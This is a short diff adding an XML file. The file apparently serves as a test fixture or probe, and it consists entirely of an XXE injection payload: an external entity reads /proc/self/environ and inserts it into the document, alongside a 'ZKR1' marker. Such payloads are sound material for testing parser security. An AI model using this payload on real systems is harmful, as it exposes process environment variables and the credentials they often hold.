@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>
+<r><meta name="description" content="ZKR1"/>&xxe;</r>
